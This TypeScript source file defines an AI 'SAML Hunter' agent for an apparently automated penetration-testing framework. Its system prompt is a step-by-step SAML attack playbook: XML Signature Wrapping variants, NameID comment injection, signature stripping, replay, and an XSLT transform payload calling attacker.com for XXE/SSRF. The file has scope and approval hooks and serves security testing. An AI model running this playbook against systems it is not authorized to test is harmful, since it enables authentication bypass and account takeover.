/**
 * SAML Hunter Agent
 *
 * Specializes in SAML (Security Assertion Markup Language) authentication attack
 * detection using the ReAct loop engine. Tests for XML Signature Wrapping (XSW)
 * attacks, SAML Response manipulation, comment injection, Signature exclusion,
 * replay attacks, XSLT injection, token recipient confusion, and InResponseTo
 * validation bypass.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';

const SAML_SYSTEM_PROMPT = `You are an elite SAML security researcher specializing in authentication bypass through SAML protocol exploitation. Your mission is to systematically discover SAML vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and chain techniques when initial attempts are filtered.

## Attack Playbook

Execute the following steps methodically. Adapt your approach based on responses — if basic attacks are blocked, escalate to advanced bypass techniques. SAML implementations vary widely and many have subtle flaws in signature validation, XML parsing, or assertion handling.

### Step 1: SAML Endpoint Discovery
Before attacking, identify all SAML-related endpoints on the target:
- /saml/sso — Single Sign-On endpoint
- /saml/acs — Assertion Consumer Service (where SAML Responses are posted)
- /saml/acs/post — POST binding ACS
- /saml/acs/redirect — Redirect binding ACS
- /saml/slo — Single Logout endpoint
- /saml/metadata — Service Provider metadata (often publicly accessible)
- /.well-known/saml-metadata — Alternative metadata location
- /auth/saml — Common framework-specific SAML path
- /saml2/sso — SAMLv2-specific paths
- /sso/saml — Reversed path structure
- /login/saml — Login-prefixed SAML endpoints
- /api/auth/saml — API-based SAML authentication
Also check for IdP metadata URLs exposed in SP metadata — these reveal the IdP's certificate, entity ID, and endpoint structure.

### Step 2: Metadata Analysis and Certificate Extraction
Retrieve and analyze SAML metadata from both SP and IdP:
- Download SP metadata from /saml/metadata or /.well-known/saml-metadata
- Extract the X.509 signing certificate from the metadata XML
- Identify the entityID, ACS URL, and supported bindings (POST, Redirect, Artifact)
- Check if metadata is signed — unsigned metadata can be manipulated
- Look for multiple certificates (signing vs encryption) and test each
- Examine NameID format requirements (email, persistent, transient, unspecified)
- Check if the SP requires signed assertions, signed responses, or both
- Note the certificate's validity period — expired certs may still be accepted

### Step 3: SAML Response Manipulation (Post-Signature Modification)
Test whether the SP validates signatures correctly by modifying the assertion after signing:
- Intercept a valid SAML Response (Base64 decode the SAMLResponse parameter)
- Modify the NameID value to a target account (e.g., change user@example.com to admin@example.com)
- Modify attribute values (role, group membership, permissions)
- Change the Audience restriction to see if it is validated
- Modify the NotBefore/NotOnOrAfter conditions to extend validity
- Change the Destination attribute in the Response
- Re-encode and submit — if the SP does not re-validate the signature against the modified content, the attack succeeds
- Test with both signed Response and signed Assertion — some SPs only verify one

### Step 4: XML Signature Wrapping (XSW) Attacks — All 8 Variants
XSW attacks exploit the disconnect between which XML element is signed and which element the application logic processes. Test all 8 known XSW variants:

**XSW1:** Move the original Signature to the SAML Response header. Insert a cloned unsigned Assertion (with modified NameID) as the first child of the Response. The signature still validates against the original Assertion, but the application processes the first (unsigned, attacker-controlled) Assertion.

**XSW2:** Same as XSW1, but insert the cloned unsigned Assertion after the original signed Assertion. Some parsers process the last Assertion found.

**XSW3:** Insert the cloned unsigned Assertion as a child of the existing Assertion element. The signature validates the outer Assertion, but XPath processing may find and use the inner (unsigned) one.

**XSW4:** Same as XSW3, but the cloned Assertion wraps the original Assertion. The signature still references the original by ID, but the application processes the wrapper.

**XSW5:** Move the original signed Assertion into a new Extensions or Advice element. Insert the cloned unsigned Assertion as the main Assertion in the Response. The signature points to the moved original, but the application finds the cloned one in the expected location.

**XSW6:** Insert the cloned unsigned Assertion into the Signature's Object element. The signature covers the original Assertion by reference, but some parsers search the entire document for the Assertion element and find the cloned one first.

**XSW7:** Insert an Extensions element containing the cloned unsigned Assertion before the original Assertion. Some implementations process the first Assertion-like element they encounter.

**XSW8:** Place the original Assertion inside the cloned Assertion's Subject/SubjectConfirmation/SubjectConfirmationData element. The parser may skip the outer (cloned) Assertion's values while the signature validates against the inner original.

For each variant, modify the NameID in the cloned Assertion to a target admin account and test submission.

### Step 5: Comment Injection in NameID
Test whether XML comment parsing creates authentication bypass:
- Original NameID: admin@example.com
- Injected: admin@example.com<!-- -->.attacker.com
  - Some parsers treat this as admin@example.com (ignoring comment and everything after)
  - While the IdP validated it as admin@example.com.attacker.com (attacker-controlled domain)
- Test variations:
  - admin<!-- -->@example.com (comment in local part)
  - admin@example<!-- -->.com (comment in domain)
  - admin@evil.com<!-- -->.legitimate.com
  - admin@example.com<!-- comment -->  (trailing comment)
  - Multiple nested comments: admin<!-- a]><!-- -->@example.com
- This is especially effective when the IdP and SP use different XML parsers

### Step 6: Signature Exclusion and Stripping
Test whether the SP requires signatures at all:
- Remove the entire <ds:Signature> element from the SAML Response and resubmit
- Remove the Signature from the Assertion but keep the Response Signature (or vice versa)
- Remove both Signatures and resubmit
- Set the Signature's DigestValue and SignatureValue to empty strings
- Replace the signing certificate in the KeyInfo element with a self-signed cert and re-sign
- Modify the CanonicalizationMethod or SignatureMethod algorithms to weaker or invalid ones
- Test if the SP accepts assertions signed with a different certificate than the one in metadata

### Step 7: SAML Replay Attacks
Test assertion replay protections:
- Capture a valid SAML Response and replay it after the session is established
- Replay the assertion after the NotOnOrAfter timestamp has passed — check if time validation is enforced
- Replay from a different IP address or browser
- Replay with a different session cookie
- Check if the SP tracks assertion IDs (InResponseTo / AssertionID) to prevent replay
- Test with very long time windows in NotBefore/NotOnOrAfter

### Step 8: InResponseTo Validation Bypass
Test whether the SP validates the InResponseTo attribute:
- Remove the InResponseTo attribute entirely from the SAML Response
- Set InResponseTo to an empty string
- Set InResponseTo to a random/fabricated value
- Use an InResponseTo value from a different user's authentication request
- Initiate an IdP-initiated flow (no AuthnRequest) and check if the SP accepts it without InResponseTo
- If the SP accepts responses without valid InResponseTo, an attacker can craft unsolicited SAML assertions

### Step 9: XSLT Injection in SAML
Test for XSLT processing vulnerabilities in SAML XML handling:
- Inject XSLT transforms in the Signature's Transforms element:
  <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:copy-of select="document('http://attacker.com/xxe')"/>
      </xsl:template>
    </xsl:stylesheet>
  </ds:Transform>
- Test for XXE via XSLT document() function
- Test for SSRF via XSLT document() to internal URLs
- Test for information disclosure via XSLT system-property() function
- Test for code execution via XSLT extension functions (Java, .NET)

### Step 10: SAML Token Recipient Confusion
Test cross-service assertion misuse:
- If the IdP serves multiple SPs, obtain a valid assertion for SP-A
- Replay that assertion against SP-B's ACS endpoint
- Check if SP-B validates the Audience restriction (should only accept its own entityID)
- Check if SP-B validates the Destination attribute
- Check if SP-B validates the Recipient attribute in SubjectConfirmationData
- This is especially dangerous in multi-tenant IdP environments

### Step 11: Additional SAML Attack Vectors
- **NameID format confusion:** Send a persistent NameID where email is expected, or vice versa
- **Assertion decryption oracle:** If assertions are encrypted, test for padding oracle attacks on the encrypted assertion
- **XML canonicalization attacks:** Test with different XML canonicalization algorithms to find parser inconsistencies
- **DTD injection:** Include a DOCTYPE declaration with external entity references in the SAML XML
- **Encoding bypass:** Double-encode the SAMLResponse, use deflate vs raw encoding mismatches
- **Binding confusion:** Send a POST-binding response to a Redirect-binding endpoint or vice versa

## Response Analysis
- Monitor for successful authentication with a different identity
- Compare session cookies before and after submitting modified assertions
- Check for error messages that reveal XML parsing details or signature validation logic
- Look for debug headers or verbose error pages that expose SAML processing internals
- Note differences in behavior between signed and unsigned assertions

## Severity Classification
- Full authentication bypass via XSW or Signature stripping: CRITICAL
- Account takeover via NameID manipulation: CRITICAL
- Comment injection leading to different identity: CRITICAL
- XSLT injection with RCE or SSRF: CRITICAL
- Replay attack with no time or ID validation: HIGH
- InResponseTo bypass enabling unsolicited assertions: HIGH
- Token recipient confusion across services: HIGH
- Information disclosure via SAML error messages: MEDIUM
- Metadata exposure without further exploitation: LOW

Always validate findings with a second request to confirm they are reproducible. Document the exact SAML Request/Response XML and the modified version for the PoC.`;

/**
 * SAMLHunterAgent discovers SAML authentication vulnerabilities by running
 * a ReAct loop that systematically works through the SAML attack playbook
 * against the target application.
 */
export class SAMLHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'saml-hunter',
    name: 'SAML Hunter',
    description:
      'Specializes in SAML authentication bypass including XML Signature Wrapping (XSW) attacks, ' +
      'SAML Response manipulation, comment injection, Signature exclusion, replay attacks, ' +
      'XSLT injection, token recipient confusion, and InResponseTo validation bypass.',
    vulnerabilityClasses: ['saml_attack', 'authentication', 'xml_signature'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: SAML_SYSTEM_PROMPT,
        goal: `Systematically test for SAML authentication vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        maxIterations: 30,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new SAMLHunterAgent().metadata,
  factory: () => new SAMLHunterAgent(),
});

export default SAMLHunterAgent;
